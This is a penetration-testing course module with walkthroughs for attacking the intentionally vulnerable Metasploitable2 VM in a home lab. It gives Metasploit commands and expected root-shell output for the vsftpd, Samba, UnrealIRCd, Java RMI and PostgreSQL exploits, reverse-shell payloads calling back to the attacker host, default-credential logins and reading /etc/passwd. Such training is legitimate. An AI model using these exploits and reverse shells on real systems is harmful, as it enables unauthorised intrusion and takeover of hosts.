# Module 15 — Practical Labs — Metasploitable2

> 🟡 **All Levels** | Complete lab walkthroughs on the intentionally vulnerable VM
> 

---

# 🧪 Practical Labs — Metasploitable2

## 📜 Lab Information

| Item | Details |
| --- | --- |
| Target VM | Metasploitable2 |
| Download | [https://sourceforge.net/projects/metasploitable/](https://sourceforge.net/projects/metasploitable/) |
| Default IP | 192.168.1.20 (set via DHCP or static) |
| Default Login | msfadmin / msfadmin |
| Purpose | Intentionally vulnerable Linux VM |
| Legal to attack | YES — in your own lab only |

## 🏗️ Lab Setup

```bash
# 1. Download Metasploitable2 VM (VMware format)
# 2. Import into VirtualBox or VMware
# 3. Set Network: Host-Only Adapter (same as Kali)
# 4. Boot Metasploitable2
# 5. Find its IP:
#    Login: msfadmin/msfadmin
#    Run: ifconfig

# From Kali, confirm connectivity:
ping 192.168.1.20
```

---

## 🔍 Lab 1: Reconnaissance — Full Service Discovery

```bash
# Launch MSF and set up workspace:
msfconsole -q
msf6 > workspace -a metasploitable2
msf6 > workspace metasploitable2

# Full Nmap scan:
msf6 > db_nmap -sV -A -p 1-65535 192.168.1.20

# Review all open services:
msf6 > services

# Expected services on Metasploitable2:
# 21    ftp      vsftpd 2.3.4
# 22    ssh      OpenSSH 4.7p1
# 23    telnet
# 25    smtp     Postfix smtpd
# 53    dns      ISC BIND 9.4.2
# 80    http     Apache 2.2.8
# 111   rpcbind
# 139   netbios  Samba 3.X
# 445   smb      Samba 3.0.20
# 512   exec     netkit-rsh
# 513   login
# 514   shell
# 1099  rmi      GNU Classpath rmiregistry
# 1524  bindshell Metasploitable root shell!
# 2049  nfs      NFS (Network File System)
# 2121  ftp      ProFTPD 1.3.1
# 3306  mysql    MySQL 5.0.51a
# 5432  postgresql
# 5900  vnc      VNC (no auth!)
# 6667  irc      UnrealIRCd
# 8009  ajp13    Apache Jserv
# 8180  http     Apache Tomcat/Coyote
```

---

## 💥 Lab 2: vsftpd 2.3.4 Backdoor Exploit

**Vulnerability:** vsftpd 2.3.4 contains a backdoor triggered by logging in with a username ending in `:)`

```bash
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > info
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.1.20
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

# Expected output:
# [*] 192.168.1.20:21 - Banner: 220 (vsFTPd 2.3.4)
# [*] 192.168.1.20:21 - Sending user: backdoored_user:)
# [*] 192.168.1.20:21 - Backdoor service has been spawned
# [*] 192.168.1.20:21 - UID: uid=0(root)
# [+] 192.168.1.20:21 - Backdoor service port: 6200
# [*] Command shell session 1 opened

# In shell:
id
# uid=0(root) gid=0(root) groups=0(root)
hostname
uname -a
cat /etc/passwd
```

---

## 💥 Lab 3: Samba usermap_script Exploit

**Vulnerability:** Samba 3.0.20 allows injection via username mapping script

```bash
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(multi/samba/usermap_script) > show options
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 192.168.1.20
msf6 exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > set LHOST 192.168.1.10
msf6 exploit(multi/samba/usermap_script) > set LPORT 4444
msf6 exploit(multi/samba/usermap_script) > run

# Expected:
# [*] Started reverse TCP handler on 192.168.1.10:4444
# [*] Command shell session 1 opened

id
# uid=0(root)
```

---

## 💥 Lab 4: UnrealIRCd Backdoor

**Vulnerability:** UnrealIRCd 3.2.8.1 contains a DEBUG3_DOLOG_SYSTEM backdoor

```bash
msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.1.20
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set PAYLOAD cmd/unix/reverse
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.1.10
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > run

id
# uid=0(root)
```

---

## 💥 Lab 5: Java RMI Exploit

```bash
msf6 > use exploit/multi/misc/java_rmi_server
msf6 exploit(multi/misc/java_rmi_server) > set RHOSTS 192.168.1.20
msf6 exploit(multi/misc/java_rmi_server) > set PAYLOAD java/meterpreter/reverse_tcp
msf6 exploit(multi/misc/java_rmi_server) > set LHOST 192.168.1.10
msf6 exploit(multi/misc/java_rmi_server) > run

meterpreter > sysinfo
meterpreter > getuid
```

---

## 💥 Lab 6: PostgreSQL with Default Creds

```bash
# Scan for PostgreSQL:
msf6 > use auxiliary/scanner/postgres/postgres_login
msf6 auxiliary(scanner/postgres/postgres_login) > set RHOSTS 192.168.1.20
msf6 auxiliary(scanner/postgres/postgres_login) > run
# [+] 192.168.1.20:5432 - Login Successful: postgres:postgres

# Execute commands via PostgreSQL:
msf6 > use exploit/linux/postgres/postgres_payload
msf6 exploit(linux/postgres/postgres_payload) > set RHOSTS 192.168.1.20
msf6 exploit(linux/postgres/postgres_payload) > set USERNAME postgres
msf6 exploit(linux/postgres/postgres_payload) > set PASSWORD postgres
msf6 exploit(linux/postgres/postgres_payload) > set LHOST 192.168.1.10
msf6 exploit(linux/postgres/postgres_payload) > run
```

---

## 💥 Lab 7: VNC No Authentication

```bash
# Metasploitable2 VNC has no password!
msf6 > use auxiliary/scanner/vnc/vnc_login
msf6 auxiliary(scanner/vnc/vnc_login) > set RHOSTS 192.168.1.20
msf6 auxiliary(scanner/vnc/vnc_login) > set BLANK_PASSWORDS true
msf6 auxiliary(scanner/vnc/vnc_login) > run
# [+] 192.168.1.20:5900 - Login Successful: :  (blank password!)

# Connect via VNC from Kali:
vncviewer 192.168.1.20:5900
# Gets full graphical desktop!
```

---

## 💥 Lab 8: MySQL with No Root Password

```bash
msf6 > use auxiliary/admin/mysql/mysql_sql
msf6 auxiliary(admin/mysql/mysql_sql) > set RHOSTS 192.168.1.20
msf6 auxiliary(admin/mysql/mysql_sql) > set USERNAME root
msf6 auxiliary(admin/mysql/mysql_sql) > set PASSWORD ""
msf6 auxiliary(admin/mysql/mysql_sql) > set SQL "show databases"
msf6 auxiliary(admin/mysql/mysql_sql) > run
# Lists all MySQL databases!
```

---

## 📝 Lab Report Template

```
=== METASPLOITABLE2 LAB REPORT ===
Date:    March 2026
Tester:  [Your Name]
Target:  192.168.1.20 (Metasploitable2)

FINDINGS SUMMARY:
[ ] vsftpd 2.3.4 Backdoor - Root shell via FTP
[ ] Samba 3.0.20 usermap_script - Root shell via SMB
[ ] UnrealIRCd backdoor - Root shell via IRC
[ ] Java RMI - Meterpreter session
[ ] PostgreSQL default creds - DB access
[ ] VNC no password - Full desktop access
[ ] MySQL root no password - Full DB access

FOR EACH FINDING:
- Vulnerability Name:
- CVE Number:
- Affected Port/Service:
- Exploit Module Used:
- Proof (screenshot/output):
- Severity: Critical / High / Medium / Low
- Recommendation:
```

---

> ✅ **All lab exercises complete! Now learn the professional Red Team methodology.**
>